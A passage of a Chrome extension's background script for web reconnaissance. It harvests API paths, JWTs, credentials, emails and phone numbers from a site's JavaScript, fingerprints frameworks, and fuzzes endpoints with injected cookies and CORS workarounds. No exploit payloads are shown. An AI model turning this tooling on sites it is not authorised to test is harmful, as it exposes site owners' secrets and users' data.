  'shiro': 'shiro',
  'yudao': 'yudao', '芋道': 'yudao',
  'ruoyi': 'ruoyi', '若依': 'ruoyi',
  'fastapi': 'fastapi',
  'django': 'django',
  'aspnet': 'aspnet', 'asp.net': 'aspnet',
  'vue': 'vue', 'vuejs': 'vue',
  'nextjs': 'nextjs', 'next.js': 'nextjs',
  'fastjson': 'fastjson',
  'jenkins': 'jenkins',
  'elasticsearch': 'elasticsearch',
  'kibana': 'kibana',
  'swagger': 'swagger',
  'docker': 'docker',
  'couchdb': 'couchdb',
  'solr': 'solr',
  'druid': 'druid',
  'phpmyadmin': 'phpmyadmin',
  'rabbitmq': 'rabbitmq',
  'mongodb': 'mongodb',
  'hadoop': 'hadoop',
  'zookeeper': 'zookeeper',
  'rsync': 'rsync',
  'ldap': 'ldap',
  'nfs': 'nfs',
  'activemq': 'activemq',
  'zabbix': 'zabbix',
  'gitlab': 'gitlab',
  'harbor': 'harbor',
  'grafana': 'grafana',
  'consul': 'consul',
  'etcd': 'etcd',
  'istio': 'istio',
  'wordpress': 'wordpress',
}

const THIRD_PARTY_DOMAINS = [
  'google-analytics.com','googletagmanager.com','doubleclick.net','googleadservices.com',
  'baidu.com/hm','hm.baidu.com',
  'facebook.net','fbcdn.net','facebook.com/tr',
  'hotjar.com','mouseflow.com','crazyegg.com','fullstory.com',
  'newrelic.com','datadoghq.com','sentry.io','bugsnag.com',
  'mixpanel.com','amplitude.com','segment.com',
  'hubspot.com','marketo.com','pardot.com','eloqua.com',
  'addthis.com','sharethis.com','addtoany.com',
  'livechatinc.com','zendesk.com','intercom.io','intercomcdn.com',
  'cloudflare.com','cdnjs.cloudflare.com','jsdelivr.net','unpkg.com',
  'polyfill.io','bootstrapcdn.com','stackpath.bootstrapcdn.com',
  'jquery.com','code.jquery.com','ajax.googleapis.com',
  'cnzz.com','51.la','tongji.linezing.com','ta.qq.com',
  'bytedance.com','bytecdn.cn','zijieapi.com','bytednsdoc.com','pstatp.com',
  'baidustatic.com','bdstatic.com','bdimg.com',
]
function isThirdParty(url) {
  try {
    const hostname = new URL(url).hostname
    for (const d of THIRD_PARTY_DOMAINS) {
      if (hostname === d || hostname.endsWith('.' + d)) return true
    }
  } catch(e) {}
  return false
}

const tabs = new Map()
const fetchingUrls = new Map()
// 已下载完成的 JS URL 集合 (跨 tab 共享), webRequest 与 content.js passive 双路去重
const downloadedUrls = new Set()
function T(id) { if (!tabs.has(id)) tabs.set(id, { apis: [], fw: [], cfg: {}, jsN: 0, url: '', domains: [], ips: [], jwts: [], creds: [], storageItems: [], runtimeReqs: [], bodyParams: [], wap: [], phones: [], githubRepos: [], params: [], processing: false }); return tabs.get(id) }
function getFetching(tabId) { if (!fetchingUrls.has(tabId)) fetchingUrls.set(tabId, new Set()); return fetchingUrls.get(tabId) }

// === SW persistence: restore on startup, save periodically ===
(async function restoreState() {
  try {
    // Try session first, then local for persistence across SW restarts
    let stored = await chrome.storage.session.get('tabSnapshots').catch(() => ({}))
    if (!stored.tabSnapshots) stored = await chrome.storage.local.get('tabSnapshots_backup').catch(() => ({}))
    if (stored.tabSnapshots) {
      for (const [id, data] of Object.entries(stored.tabSnapshots)) {
        const numId = parseInt(id)
        if (!tabs.has(numId)) {
          tabs.set(numId, { ...data, processing: false })
        }
      }
    }
  } catch (e) { /* ignore */ }
})()
function persistState() {
  try {
    const snap = {}
    tabs.forEach((v, k) => {
      if (v.apis?.length || v.domains?.length) snap[k] = { ...v, processing: false }
    })
    if (Object.keys(snap).length) {
      chrome.storage.session.set({ tabSnapshots: snap })
      // Backup to storage.local periodically so state survives service worker restart
      chrome.storage.local.set({ tabSnapshots_backup: snap, _persistTs: Date.now() })
    }
  } catch (e) { /* ignore */ }
}
setInterval(persistState, 5000) // every 5s

// === content发来的被动数据 ===
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === 'passive') {
    if (!sender.tab?.id) return // 修复: 原代码在判空前调用 T(undefined) 会创建幽灵 Map 条目
    const t = T(sender.tab.id)
    t.url = msg.url; t.title = msg.title
    // 合并框架 (不覆盖)
    if (msg.fw?.length) {
      const existKeys = new Set(t.fw.map(f => f.key))
      for (const f of msg.fw) { if (!existKeys.has(f.key)) { t.fw.push(f); existKeys.add(f.key) } }
    }
    t.cfg = msg.cfg || t.cfg || {}; t.forms = msg.forms || t.forms || []
    mergeAPIs(t, msg.apis || [])
    // 合并其他信息类型
    const mergeList = (field, list) => {
      if (!list || !list.length) return
      // Items can be plain strings or arrays [value, source]
      const existing = new Set((t[field] || []).map(x => Array.isArray(x) ? x[0] : (typeof x === 'string' ? x : (x.value ?? x))))
      for (const item of list) {
        const key = Array.isArray(item) ? item[0] : (typeof item === 'string' ? item : (item.value ?? item))
        if (key && !existing.has(key)) { t[field].push(item); existing.add(key) }
      }
    }
    mergeList('domains', msg.domains)
    mergeList('ips', msg.ips)
    mergeList('jwts', msg.jwts)
    mergeList('creds', msg.creds)
    mergeList('phones', msg.phones)
    mergeList('githubRepos', msg.githubs)
    // emails 也属于凭据类, 合并到 creds 保留; cookies/companies 暂不存储 (干扰大、价值低)
    if (msg.emails?.length) {
      const existVal = new Set((t.creds || []).map(x => Array.isArray(x) ? x[0] : (typeof x === 'string' ? x : (x.value ?? x))))
      for (const e of msg.emails) { if (e && !existVal.has(e)) { t.creds.push([e, 'email']); existVal.add(e) } }
    }
    // storage scan results
    if (msg.storageItems?.length) {
      const exist = new Set(t.storageItems)
      for (const s of msg.storageItems) { if (!exist.has(s)) { t.storageItems.push(s); exist.add(s) } }
    }
    // runtime intercepted requests
    if (msg.runtimeReq) {
      const r = msg.runtimeReq
      r.respBody = (r.respBody || '').slice(0, 1024) // cap for storage
      // dedup by pathname+method (ignore varying query params)
      let rPath = r.url; try { rPath = new URL(r.url).pathname } catch(e) {}
      const dup = t.runtimeReqs.some(x => {
        let xPath = x.url; try { xPath = new URL(x.url).pathname } catch(e) {}
        return xPath === rPath && x.method === r.method
      })
      if (!dup && t.runtimeReqs.length < 400) t.runtimeReqs.push(r)
    }
    // accumulate POST body param keys
    if (msg.bodyParams?.length) {
      const exist = new Set(t.bodyParams)
      for (const k of msg.bodyParams) { if (!exist.has(k)) { t.bodyParams.push(k); exist.add(k) } }
    }
    // Wappalyzer 指纹结果 (按 name 去重合并)
    if (msg.wap?.length) {
      const existNames = new Set(t.wap.map(w => w.name))
      for (const w of msg.wap) {
        if (!existNames.has(w.name)) { t.wap.push(w); existNames.add(w.name) }
        else {
          // Update confidence if new result is higher
          const existing = t.wap.find(ew => ew.name === w.name)
          if (existing && w.confidence > existing.confidence) {
            existing.confidence = w.confidence
            if (w.version && !existing.version) existing.version = w.version
          }
        }
      }
    }
    badge(sender.tab.id)
    // 异步处理
    processInline(t, msg.inlineScripts || [])
    downloadJS(sender.tab.id, msg.tasks || [])
    sendResponse({ ok: true })
  }
  if (msg.action === 'getData') { chrome.tabs.query({ active: true, currentWindow: true }, ([t]) => { const d = t ? T(t.id) : {}; sendResponse({ ...d, tabId: t?.id, capturedToken: d._token || '', fwExploits: FW_EXPLOITS, fwKeyMap: FW_KEY_MAP }) }); return true }
  if (msg.action === 'storeToken') { if (sender.tab?.id) T(sender.tab.id)._token = msg.token; sendResponse({ ok: true }); return } // 修复: 不再 return true, 避免消息通道悬挂
  if (msg.action === 'siteAnalysis') { handleSiteAnalysis(msg, sender, sendResponse); return true }
  if (msg.action === 'fuzz') { fuzzURL(msg.url, msg.method, { ...msg.headers, _tabId: sender.tab?.id }).then(sendResponse); return true }
  if (msg.action === 'clear') {
    chrome.tabs.query({ active: true, currentWindow: true }, ([t]) => {
      if (t) {
        const fresh = { apis: [], fw: [], cfg: {}, jsN: 0, url: '', domains: [], ips: [], jwts: [], creds: [], storageItems: [], runtimeReqs: [], bodyParams: [], wap: [], phones: [], githubRepos: [], params: [], processing: false }
        tabs.set(t.id, fresh)
        badge(t.id)
        // 清空当前 tab 的 in-flight JS 下载集合, 避免旧任务完成后回填
        getFetching(t.id).clear()
      }
    })
    // 修复: 之前没清持久化, 下次开 popup 又把 lastFuzzRes / lastData 拉回来显示, 看起来"莫名有记录"
    chrome.storage.local.remove(['lastData', 'lastFuzzRes', 'lastFuzzTotal', 'fuzzTruncated', 'fuzzTruncatedCount'])
    sendResponse({ ok: true })
  }
})

// === 网站解析 (ICP / IP / 权重) ===
async function handleSiteAnalysis(msg, sender, sendResponse) {
  const { domain, tabId } = msg
  // 先检查缓存
  try {
    const cacheKey = `analysis_${domain}`
    const cached = await chrome.storage.session.get(cacheKey)
    if (cached[cacheKey] && cached[cacheKey].ts && Date.now() - cached[cacheKey].ts < 3600000) {
      sendResponse(cached[cacheKey].data)
      return true
    }
  } catch (e) { /* ignore */ }

  const result = { domain, icp: null, ip: null, weight: null }

  // 并行查询
  const [icpData, ipData] = await Promise.all([
    fetchIcpInfo(domain),
    fetchIpInfo(domain)
  ]).catch(() => [null, null])

  result.icp = icpData
  result.ip = ipData

  // 缓存1小时
  try {
    await chrome.storage.session.set({ [`analysis_${domain}`]: { data: result, ts: Date.now() } })
  } catch (e) { /* ignore */ }

  sendResponse(result)
  return true
}

async function fetchIcpInfo(domain) {
  const ipv4 = /^\d{1,3}(\.\d{1,3}){3}$/
  if (ipv4.test(domain)) return { icp: 'IP地址不适用', unit: '-', time: '-' }
  try {
    const cfg = await chrome.storage.local.get(['icpApiId', 'icpApiKey']).catch(() => ({}))
    const id = cfg.icpApiId || '', key = cfg.icpApiKey || ''
    if (!id || !key) return { icp: '请在设置中配置ICP API密钥', unit: '-', time: '-' }
    const r = await fetch(`https://cn.apihz.cn/api/wangzhan/icp.php?id=${encodeURIComponent(id)}&key=${encodeURIComponent(key)}&domain=${encodeURIComponent(domain)}`)
    if (!r.ok) return null
    const data = await r.json()
    if (data.code === 404) return { icp: '未查询到备案信息', unit: '未知', time: '未知' }
    return { icp: data.data?.icp || data.data?.icp_no || '-', unit: data.data?.unit || '-', time: data.data?.time || '-' }
  } catch (e) { return null }
}

async function fetchIpInfo(domain) {
  try {
    const cfg = await chrome.storage.local.get(['ipApiId', 'ipApiKey']).catch(() => ({}))
    const id = cfg.ipApiId || '', key = cfg.ipApiKey || ''
    if (!id || !key) return { ip: domain, location: '请在设置中配置IP API密钥', isp: '-' }
    const r = await fetch(`https://cn.apihz.cn/api/ip/ip_json.php?id=${encodeURIComponent(id)}&key=${encodeURIComponent(key)}&ip=${encodeURIComponent(domain)}`)
    if (!r.ok) return null
    const data = await r.json()
    if (data.data) return { ip: data.data?.ip || domain, location: [data.data?.country, data.data?.region, data.data?.city].filter(Boolean).join(' ') || '-', isp: data.data?.isp || '-' }
    return null
  } catch (e) { return null }
}

function mergeAPIs(t, newAPIs) {
  const seen = new Set(t.apis.map(a => a.path + a.method))
  for (const a of newAPIs) { if (!seen.has(a.path + a.method) && t.apis.length < 600) { t.apis.push(a); seen.add(a.path + a.method) } }
}

// === 内联脚本直接提取(不走网络) ===
function processInline(t, scripts) {
  const apiFilter = new SvAPIFilter(), fwDetect = new SvFwDetect()
  const seen = new Set(t.apis.map(a => a.path + a.method))
  for (const text of scripts) {
    for (const p of (apiFilter.extract(text) || [])) {
      const m = apiFilter.method(p)
      if (!seen.has(p + m) && t.apis.length < 600) { seen.add(p + m); t.apis.push({ path: p, method: m, classify: apiFilter.classify(p) }) }
    }
  }
  // 框架+配置 — append newly detected frameworks
  if (scripts.length) {
    const newFw = fwDetect.detect(scripts.join('\n')) || []
    for (const nf of newFw) {
      if (!t.fw.some(f => f.key === nf.key)) t.fw.push(nf)
    }
  }
  scripts.forEach(s => Object.assign(t.cfg, fwDetect.extractConfig(s) || {}))
  // 采纳 ParamX: JS 参数全量提取
  if (PARAM_EXTRACTOR_LOADED && typeof self.ParamExtractor !== 'undefined') {
    const pe = new self.ParamExtractor()
    scripts.forEach(s => mergeParams(t, pe.extract(s)))
  }
}

// 合并提取到的参数到 tab 状态 (去重 + 优先级/来源合并)
function mergeParams(t, extracted) {
  if (!extracted || !extracted.length) return
  if (!t.params) t.params = []
  const seen = new Set(t.params.map(p => p.value))
  for (const p of extracted) {
    if (t.params.length >= 1200) break
    if (!seen.has(p.value)) {
      seen.add(p.value); t.params.push(p)
    } else {
      const ex = t.params.find(x => x.value === p.value)
      if (ex) {
        if (p.priority > ex.priority) ex.priority = p.priority
        if (p.category !== 'general' && ex.category === 'general') ex.category = p.category
        if (p.source && !ex.source.includes(p.source)) ex.source = ex.source + ',' + p.source
        const tags = new Set([...(ex.tags||[]), ...(p.tags||[])])
        ex.tags = [...tags]
      }
    }
  }
}

// === 下载外部JS (CORS降级: fetch→chrome.scripting注入) ===
async function downloadJS(tabId, tasks) {
  const t = T(tabId)
  t.processing = true
  const fetching = getFetching(tabId)
  // filter out already-fetching AND already-downloaded URLs (跨 tab 去重, 避免 webRequest + content.js 双路重复)
  const fresh = (tasks || []).filter(u => u.startsWith('http') && !fetching.has(u) && !downloadedUrls.has(u) && !isThirdParty(u))
  if (!fresh.length) return
  fresh.forEach(u => fetching.add(u))
  const apiFilter = new SvAPIFilter(), fwDetect = new SvFwDetect()
  const seenApis = new Set(t.apis.map(a => a.path))
  const seenDomains = new Set((t.domains||[]).map(d => typeof d === 'string' ? d : d[0]))
  const seenIps = new Set((t.ips||[]).map(d => typeof d === 'string' ? d : d[0]))

  for (const url of fresh) {
    try {
      const text = await fetchWithFallback(tabId, url)
      if (!text || text.length < 100) continue

      for (const p of (apiFilter.extract(text) || [])) { if (!seenApis.has(p) && t.apis.length < 600) { seenApis.add(p); t.apis.push({ path: p, method: apiFilter.method(p), classify: apiFilter.classify(p) }) } }

      const newFw = fwDetect.detect(text) || []
      for (const nf of newFw) { if (!t.fw.some(f => f.key === nf.key)) t.fw.push(nf) }
      Object.assign(t.cfg, fwDetect.extractConfig(text) || {})

      const domains = extractDomains(text)
      const ips = extractIps(text)
      for (const d of domains) { if (!seenDomains.has(d)) { seenDomains.add(d); t.domains.push(d) } }
      for (const ip of ips) { if (!seenIps.has(ip)) { seenIps.add(ip); t.ips.push(ip) } }

      // 采纳 ParamX: 从 JS 全量提取参数 (对象属性/解构/函数参数/URL参数/路由参数等)
      if (PARAM_EXTRACTOR_LOADED && typeof self.ParamExtractor !== 'undefined') {
        try {
          const extracted = new self.ParamExtractor().extract(text)
          mergeParams(t, extracted)
        } catch (e) { /* skip */ }
      }

      t.jsN = (t.jsN || 0) + 1; badge(tabId)
      // 标记已下载, 避免 webRequest 二次触发 + 跨 tab 重复
      if (text) downloadedUrls.add(url)
    } catch (e) { /* skip */ }
  }
  t.processing = false
  badge(tabId)
}

// 简单域名提取（background环境，无需依赖Extractor）
function extractDomains(text) {
  const re = /(?:\b[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]\.)+(?:[a-zA-Z]{2,63})(?:\:\d{1,5})?\b/gi
  const tlds = /\.(?:com|cn|net|org|io|cc|top|vip|xyz|club|site|online|tech|store|wang|fun|space|info|pro|biz|co|me|tv|mobi|asia|studio|design|law|shop|art|press|icu|link|fan|cloud|games|cash|cafe|band|media|work|ren|yoga|red|luxe|fashion|technology|ski|pink|host|kim|pet|run|pub|chat|group|live|city|cool|fund|gold|guru|life|team|today|world|zone|social|bio|black|blue|green|lotto|organic|poker|promo|vote|archi|voto|fit|web|app|dev|ai|email|video|market|shopping|mba|sale|news|fyi|tax|gov|edu|mil)$/i
  const found = []; let m
  while ((m = re.exec(text)) !== null) {
    const d = m[0]
    if (/^(?:localhost|127\.|0\.0\.0\.0|10\.\d|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)/.test(d)) continue
    const hostOnly = d.replace(/:\d+$/, '')
    if (!tlds.test(hostOnly)) continue
    if (/\.(?:js|css|png|jpe?g|gif|svg|woff2?|ttf|eot|json|xml|html?|mp[34]|pdf|zip|tar|gz)$/i.test(hostOnly)) continue
    found.push(d)
  }
  return [...new Set(found)]
}
function extractIps(text) {
  const re = /(?<!\.|\d)(?:(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)(?::\d{1,5})?/g
  const found = []; let m
  while ((m = re.exec(text)) !== null) { const ip = m[0].split(':')[0]; if (!/^(?:0\.0\.0\.0|255\.255\.255\.255|127\.0\.0\.1)$/.test(ip)) found.push(m[0]) }
  return [...new Set(found)]
}

// fetch 降级: 先直接fetch, CORS失败则注入页面上下文
async function fetchWithFallback(tabId, url, fetchHeaders) {
  try {
    const r = await fetch(url, { mode: 'cors', headers: { 'Accept': '*/*' } })
    if (!r.ok) return null
    return await r.text()
  } catch (e) {
    // CORS blocked — fallback to page-context fetch via scripting
    if (tabId && tabId > 0) {
      try {
        const { _tabId: _ti, ...fetchHdrs } = fetchHeaders || {}
        const results = await chrome.scripting.executeScript({
          target: { tabId },
          func: (u, hdrs) => fetch(u, { credentials: 'omit', headers: hdrs || {} }).then(r => r.text()).catch(() => null),
          args: [url, fetchHdrs]
        })
        return results?.[0]?.result || null
      } catch (e2) { return null }
    }
    return null
  }
}

function badge(tabId) {
  if (!tabId || tabId < 0) return
  const t = tabs.get(tabId)
  if (!t) return
  let total = 0
  const fields = ['apis', 'domains', 'ips', 'jwts', 'creds', 'storageItems', 'runtimeReqs', 'wap', 'phones', 'githubRepos']
  for (const f of fields) { if (t[f]) total += t[f].length }
  const text = total > 0 ? (total > 999 ? '1k+' : String(total)) : ''
  chrome.action.setBadgeText({ text, tabId })
  chrome.action.setBadgeBackgroundColor({ color: total > 10 ? '#e94560' : '#f39c12', tabId })
}

// ============================================================
// Offscreen Document 管理 (借鉴 Phantom)
// ============================================================
let _offscreenCreating = false, _offscreenReady = false, _offscreenChecking = false

async function ensureOffscreen() {
  // Return cached if known ready
  if (_offscreenReady) return true
  if (_offscreenCreating) {
    // Wait up to 1s for creation to finish
    for (let i = 0; i < 10; i++) {
      await new Promise(r => setTimeout(r, 100))
      if (_offscreenReady) return true
    }
    return false
  }
  _offscreenCreating = true
  try {
    // Check if already exists
    const existing = await chrome.runtime.getContexts({ contextTypes: ['OFFSCREEN_DOCUMENT'] })
    if (existing.length > 0) {
      _offscreenReady = true
      // Verify responsive
      try {
        const resp = await chrome.runtime.sendMessage({ action: 'ping' })
        if (resp?.pong) { _offscreenCreating = false; return true }
      } catch(e) {
        // Need to recreate
        _offscreenReady = false
      }
    }
    // Close stale offscreen
    try { await chrome.offscreen.closeDocument() } catch(e) {}

    await chrome.offscreen.createDocument({
      url: 'offscreen.html',
      reasons: ['DOM_SCRAPING'],
      justification: '发送带Cookie和自定义Headers的Fuzz请求'
    })
    // Wait for it to be ready
    await new Promise(r => setTimeout(r, 200))
    _offscreenReady = true
    return true
  } catch(e) {
    if (e.message?.includes('single offscreen')) {
      _offscreenReady = true
      return true
    }
    console.warn('[DesJsFinder] Offscreen create failed:', e.message)
    return false
  } finally {
    _offscreenCreating = false
  }
}

// ============================================================
// declarativeNetRequest 动态 Header 注入
// ============================================================
let _headerRuleId = 100
const _headerRuleIds = new Set() // 跟踪所有已添加的规则 id, 保证并发下清理安全
async function injectHeadersForDomain(hostname, headers) {
  if (!hostname || !headers || !Object.keys(headers).length) return
  try {
    const requestHeaders = []
    for (const [key, value] of Object.entries(headers)) {
      if (!key || !value) continue
      const lk = key.toLowerCase()
      // Skip content-type (auto-set by fetch), skip forbidden headers
      if (['content-type','content-length','host','origin','referer'].includes(lk)) continue
      requestHeaders.push({ header: key, operation: 'set', value: value })
    }
    if (!requestHeaders.length) return

    const ruleId = _headerRuleId++
    _headerRuleIds.add(ruleId)
    await chrome.declarativeNetRequest.updateDynamicRules({
      addRules: [{
        id: ruleId,
        priority: 1,
        action: { type: 'modifyHeaders', requestHeaders },
        condition: { urlFilter: `*://${hostname}/*`, resourceTypes: ['xmlhttprequest','other'] }
      }],
      // 仅保留最新一条 (并发场景下旧规则可能属于其他 in-flight 请求, 但值相同, 无影响)
      removeRuleIds: [..._headerRuleIds].filter(id => id !== ruleId)
    })
    // Store for cleanup
    self.__dnrRuleId = ruleId
  } catch(e) {
    console.warn('[DesJsFinder] declarativeNetRequest rule failed:', e.message)
  }
}

async function removeHeaderInjection() {
  try {
    const ids = [..._headerRuleIds]
    if (ids.length) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: ids })
    _headerRuleIds.clear()
    self.__dnrRuleId = 0
  } catch(e) {}
}

// ============================================================
// Fuzz URL — 优先使用 offscreen document (带 Cookie)
// ============================================================
async function fuzzURL(url, method, headers) {
  const fetchHeaders = { ...headers }
  let body = undefined
  if (method === 'POST') {
    fetchHeaders['Content-Type'] = 'application/json'
    body = '{}'
  }
  const _tabId = fetchHeaders._tabId
  delete fetchHeaders._tabId

  // Clean up internal/forbidden headers
  for (const k of Object.keys(fetchHeaders)) {
    const lk = k.toLowerCase()
    if (['host','origin','referer','content-length'].includes(lk)) delete fetchHeaders[k]
  }

  const _doDirectFetch = async (methodOverride, bodyOverride) => {
    try {
      const r = await fetch(url, { method: methodOverride, headers: { ...fetchHeaders }, body: bodyOverride, mode: 'cors' })
      const text = await r.text()
      return { url, method: methodOverride, status: r.status, size: text.length, body: text.substring(0, 50000), contentType: r.headers.get('content-type')||'' }
    } catch(e) { return null }
  }

  // First try: direct fetch (fast path, works for most non-auth APIs)
  let res = await _doDirectFetch(method, body)

  // POST retry logic for direct fetch
  if (method === 'POST' && res && res.status === 400 && !(res.contentType||'').includes('json')) {
    fetchHeaders['Content-Type'] = 'application/x-www-form-urlencoded'
    res = await _doDirectFetch(method, 'id=1') || res
  }
  if (method === 'POST' && res && res.status === 400) {
    delete fetchHeaders['Content-Type']
    const gr = await _doDirectFetch('GET', undefined)
    if (gr && gr.status < 400) res = { ...gr, method: 'POST→GET' }
  }

  // If direct fetch got a non-error response, return it
  if (res && res.status > 0 && res.status !== 0) {
    const fp = (RESP_FP_LOADED ? new ResponseFingerprint() : new SvFingerprint()).analyze(res.body, res.status)
    return { ...res, fp }
  }

  // Direct fetch failed (CORS / network error) — try offscreen document
  const hasAuth = fetchHeaders['authorization'] || fetchHeaders['cookie'] ||
    Object.keys(fetchHeaders).some(k => k.toLowerCase() === 'authorization' || k.toLowerCase() === 'cookie')

  // 修复: 原门控 res.status === 0 永不可达 (fetch 失败时 _doDirectFetch 返回 null 而非 status 0),
  // 导致 offscreen Cookie 通道从未生效。改为 res 为 null 或 status 0 且带认证头时走 offscreen。
  if ((!res || res.status === 0) && hasAuth) {
    try {
      const offscreenReady = await ensureOffscreen()
      if (offscreenReady) {
        // 显式 Cookie 头: fetch API 禁止 JS 设置 Cookie, 需经 declarativeNetRequest 注入
        // 后由 offscreen 请求携带 (请求结束后立即移除规则, 避免影响页面正常流量)
        const cookieKey = Object.keys(fetchHeaders).find(k => k.toLowerCase() === 'cookie')
        let dnrInjected = false
        if (cookieKey && fetchHeaders[cookieKey]) {
          try {
            const hostname = new URL(url).hostname
            if (hostname) {
              await injectHeadersForDomain(hostname, { cookie: fetchHeaders[cookieKey] })
              dnrInjected = true
              delete fetchHeaders[cookieKey]
            }
          } catch(e) {}
        }
        const resp = await chrome.runtime.sendMessage({
          action: 'offscreenFetch',
          id: Date.now(),
          url, method: method, headers: fetchHeaders, body: body,
          timeout: 8000
        })
        if (dnrInjected) { try { await removeHeaderInjection() } catch(e) {} }
        if (resp?.success && resp.data && resp.data.status > 0) {
          const r = resp.data
          const fp = (RESP_FP_LOADED ? new ResponseFingerprint() : new SvFingerprint()).analyze(r.body || '', r.status)
          return { url, method: method, status: r.status, size: r.size || 0, body: r.body?.substring(0, 50000) || '', contentType: r.contentType || '', fp }
        }
      }
    } catch(e) {
      // Offscreen failed, continue to CORS fallback
    }
  }

  // Second chance: if we got a direct result, return with fingerprint
  if (res) {
    const fp = (RESP_FP_LOADED ? new ResponseFingerprint() : new SvFingerprint()).analyze(res.body, res.status)
    return { ...res, fp }
  }

  // Ultimate fallback: CORS fallback via page context scripting
  if (_tabId && _tabId > 0) {
    for (const tryMethod of [method, 'GET']) {
      try {
        const text = await fetchWithFallback(_tabId, url, fetchHeaders)
        if (text) {
          const fp = (RESP_FP_LOADED ? new ResponseFingerprint() : new SvFingerprint()).analyze(text, 200)
          return { url, method: tryMethod, status: 200, size: text.length, body: text.substring(0, 50000), contentType: 'text/html', fp }
        }
      } catch(e2) {}
    }
  }
  return { url, method, status: 0, size: 0, body: 'network error', error: true }
}

chrome.tabs.onRemoved.addListener(id => { tabs.delete(id); fetchingUrls.delete(id) })

// ============================================================
// TideFinger 指纹加载 (5334条header关键词, 207KB)
// ============================================================
let TIDE_FP_LOADED = false, RESP_FP_LOADED = false, PARAM_EXTRACTOR_LOADED = false
try {
  importScripts('filters/tide-fingerprint.js')
  TIDE_FP_LOADED = true
  console.log('[DesJsFinder] TideFinger loaded: ' + Object.keys(self.TIDE_H||{}).length + ' fingerprints')
} catch(e) { console.warn('TideFinger load failed:', e) }
try {
  importScripts('filters/response-fingerprint.js')
  RESP_FP_LOADED = true
  console.log('[DesJsFinder] ResponseFingerprint loaded')
} catch(e) { console.warn('ResponseFingerprint load failed:', e) }
try {
  importScripts('filters/param-extract.js')
  PARAM_EXTRACTOR_LOADED = true
  console.log('[DesJsFinder] ParamExtractor loaded')
} catch(e) { console.warn('ParamExtractor load failed:', e) }

// 头指纹配置 (TideFinger升级版)
const HEADER_FPS = [
  { type: 'server', name: 'Apache', pattern: /apache\/?([\d\.]+)?/i, header: 'server', value: 'version' },
  { type: 'server', name: 'Apache Tomcat', pattern: /apache-(coyote)\/?([\d\.]+)?/i, header: 'server', value: 'component,version', extType: 'technology', extName: 'Java' },
  { type: 'server', name: 'Nginx', pattern: /nginx\/?([\d\.]+)?/i, header: 'server', value: 'version' },
  { type: 'server', name: 'IIS', pattern: /microsoft-iis\/?([\d\.]+)?/i, header: 'server', value: 'version', extType: 'os', extName: 'Windows' },
  { type: 'server', name: 'Jetty', pattern: /jetty\s?\/?\(?([0-9a-zA-Z.-]*)\)?/i, header: 'server', value: 'version', extType: 'technology', extName: 'Java' },
  { type: 'server', name: 'OpenResty', pattern: /openresty\/?([\d\.]+)?/i, header: 'server', value: 'version', extType: 'server', extName: 'Nginx' },
  { type: 'server', name: 'Tengine', pattern: /tengine\/?([\d\.]+)?/i, header: 'server', value: 'version' },
  { type: 'server', name: 'Cloudflare', pattern: /cloudflare\/?([\d\.]+)?/i, header: 'server', value: 'version' },
  { type: 'framework', name: 'Spring Boot', pattern: /([a-zA-Z0-9\.\-]+):([a-zA-Z0-9\-]+):(\d+)/i, header: 'x-application-context', value: 'app,env,port', extType: 'technology', extName: 'Java' },
  { type: 'framework', name: 'ASP.NET', pattern: /[0-9.]+/i, header: 'x-aspnet-version', value: 'version' },
  { type: 'framework', name: 'Express', pattern: /express/i, header: 'x-powered-by', extType: 'technology', extName: 'Node.js' },
  { type: 'technology', name: 'PHP', pattern: /php\/?([\d\.]+)?/i, header: 'x-powered-by', value: 'version' },
  { type: 'technology', name: 'Java', pattern: /java/i, header: 'x-powered-by' },
  { type: 'technology', name: 'Python', pattern: /python\/?([\d\.]+)?/i, header: 'server', value: 'version' },
  { type: 'security', name: 'HSTS', pattern: /max-age=(\d+)/i, header: 'strict-transport-security', value: 'time' },
  { type: 'cdn', name: 'CDN', pattern: /cdn/i, header: 'server' },
]

const COOKIE_FPS = [
  { type: 'technology', name: 'PHP', match: /PHPSESSID/i, desc: 'Cookie包含PHPSESSID，网站使用PHP' },
  { type: 'framework', name: 'ASP.NET', match: /ASP\.NET_SessionId|ASPSESSIONID/i, desc: 'Cookie包含ASP.NET Session，网站使用ASP.NET框架' },
  { type: 'technology', name: 'Java', match: /JSESSIONID|jeesite/i, desc: 'Cookie包含JSESSIONID，网站使用Java技术栈' },
  { type: 'framework', name: 'Shiro', match: /rememberMe/i, desc: 'Cookie包含rememberMe，网站可能使用Apache Shiro框架' },
  { type: 'framework', name: 'Laravel', match: /laravel_session/i, desc: 'Cookie包含laravel_session，网站使用Laravel框架' },
]

// 从响应头提取指纹
function processHeaders(headers, tabId) {
  const t = T(tabId)
  const headerMap = new Map(headers.map(h => [h.name.toLowerCase(), h.value]))
  const fps = []
  // 1. Built-in regex patterns (16 entries)
  for (const fp of HEADER_FPS) {
    const val = headerMap.get(fp.header.toLowerCase())
    if (val && !t.fw.some(f => f.key === fp.name.toLowerCase())) {
      const m = val.match(fp.pattern)
      if (m) {
        let desc = `通过${fp.header}头识别到${fp.name}`
        if (fp.value) { const parts = fp.value.split(','); desc += ' (' + parts.map((p, i) => p+'='+(m[i+1]||'?')).join(', ') + ')' }
        fps.push({ type: fp.type, name: fp.name, key: fp.name.toLowerCase(), description: desc, version: fp.name, prefix: '', score: 80 })
      }
    }
  }
  // 2. TideFinger header keywords
  if (TIDE_FP_LOADED && typeof self.TIDE_H !== 'undefined') {
    const hdrs = ['server','x-powered-by','set-cookie']
    const keywords = Object.keys(self.TIDE_H)
    const matched = new Set()
    for (const h of hdrs) {
      const val = headerMap.get(h)
      if (!val) continue
      const lv = val.toLowerCase()
      for (const kw of keywords) {
        if (lv.includes(kw)) {
          const product = self.TIDE_H[kw].split(',')[0]
          if (product && !matched.has(product)) {
            matched.add(product)
            fps.push({ type: 'technology', name: product, key: product.toLowerCase(), description: product, version: product, prefix: '', score: 70 })
          }
        }
      }
    }
  }
  return fps
}

function processCookies(cookieStr) {
  const fps = []
  for (const fp of COOKIE_FPS) {
    if (fp.match.test(cookieStr)) {
      fps.push({ type: fp.type, name: fp.name, description: fp.desc })
    }
  }
  return fps
}

// 监听响应头
if (chrome.webRequest) {
  chrome.webRequest.onHeadersReceived.addListener(
    details => {
